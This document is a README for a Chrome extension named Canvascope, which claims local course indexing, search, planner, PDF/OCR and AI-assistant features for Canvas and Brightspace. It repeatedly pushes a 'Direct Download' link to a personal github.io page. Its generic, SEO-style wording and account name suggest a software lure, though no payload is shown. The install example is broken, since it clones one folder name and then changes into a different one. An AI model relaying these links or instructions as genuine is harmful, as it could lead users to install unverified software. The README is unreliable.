# Canvascope v10.1.0 - Chrome Extension 2026

> **Canvascope is a Chrome extension for Canvas and Brightspace that creates local-first course indexes, enables rapid search, and adds planner and PDF workflows in version 10.1.0.**

[![Platform](https://img.shields.io/badge/Platform-Chrome-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v10.1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carterbrooksngyy9741/canvascope-v1010-extension-hub?style=flat-square)](https://github.com/carterbrooksngyy9741/canvascope-v1010-extension-hub)

---

<p align="center">
  <a href="https://carterbrooksngyy9741.github.io/canvascope-v1010-extension-hub/">
    <img src="https://img.shields.io/badge/Download-Canvascope%20Latest-brightgreen?style=for-the-badge" alt="Download Canvascope">
  </a>
</p>

> **[Direct Download - Canvascope v10.1.0](https://carterbrooksngyy9741.github.io/canvascope-v1010-extension-hub/)**

---

[Download Latest Build](https://carterbrooksngyy9741.github.io/canvascope-v1010-extension-hub/)

---

## Overview

Canvascope is built to make course materials easier to navigate by keeping indexes local in the browser. That means you can search across LMS pages and documents without constantly bouncing between tabs or losing your place. It is aimed at users working in Canvas or Brightspace who need quicker access to course information, task tracking, and smoother movement through class materials.

The extension brings together course-bound search, planner-focused workflows, PDF text extraction, OCR-powered lookup, and a hybrid local AI RAG assistant. It also supports Lectra PDF handoff and realtime sync, which is useful when document-based workflows need course files and follow-up actions to stay linked.

---

## What it can do

- Local-first indexing for LMS content
- Fast search across course materials
- Course-scoped queries for focused results
- Planner workflows for organizing academic tasks
- Offline PDF text extraction for document search
- OCR search for scanned or image-based PDFs
- Hybrid local AI RAG assistant for contextual help
- Lectra PDF handoff with realtime sync support

---

## Installation

1. Download or clone this repository.
2. Load the extension into Chrome using the unpacked extension workflow.
3. Make sure the required project files are present before the first launch.
4. Open the extension from Chrome and connect it to your course environment.

Example:

```bash
git clone https://github.com/carterbrooksngyy9741/canvascope-v1010-extension-hub.git
cd canvascope
```

After loading it in Chrome, refresh the page where you want Canvascope to index or search course content.

---

## Using Canvascope

When you are browsing Canvas or Brightspace, Canvascope can index course content and make it searchable directly from the browser. A common flow is:

1. Open the LMS course page.
2. Let Canvascope build or update the local index.
3. Run a search query for a course, file, assignment, or note.
4. Use planner-related views to follow up on tasks.
5. Open PDFs for text extraction or OCR-assisted lookup.
6. Send supported PDFs through the Lectra handoff flow when needed.

For quicker results, scope searches to a specific course so the output stays tied to the right class or workspace.

---

## Configuration

Canvascope stores its settings and working data inside the browser extension environment. Depending on your setup, configuration can cover LMS connection details, local indexing behavior, search preferences, and assistant-related options.

If your build uses external services or sync, review the project settings before use and tune them to fit your environment.

Example config shape:

```json
{
  "platform": "Chrome",
  "lms": ["Canvas", "Brightspace"],
  "searchMode": "local-first",
  "pdf": {
    "textExtraction": true,
    "ocr": true
  },
  "assistant": {
    "rag": "hybrid"
  }
}
```

---

## Requirements

- Google Chrome
- A supported Canvas or Brightspace environment
- Permission to load and use Chrome extensions
- Local browser storage for indexes and settings
- PDF access for text extraction and OCR workflows
- Optional connectivity for sync or AI-related features, depending on your setup

---

## FAQ

### How do I get updates?
Use the latest build from the download link above and replace the existing extension version following your normal Chrome extension update flow.

### Where are settings stored?
Settings are handled inside the browser extension environment and may also involve local storage or service-backed sync, depending on your configuration.

### What if search results are incomplete?
Try refreshing the course page, rebuilding the local index, or narrowing the query to a specific course scope.

### Does it work with PDFs?
Yes. Canvascope includes offline PDF text extraction and OCR search for documents that need more than standard text lookup.

### Who should use it?
It is best suited for people working with Canvas or Brightspace who want faster access to course materials, planner support, and document search from the browser.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
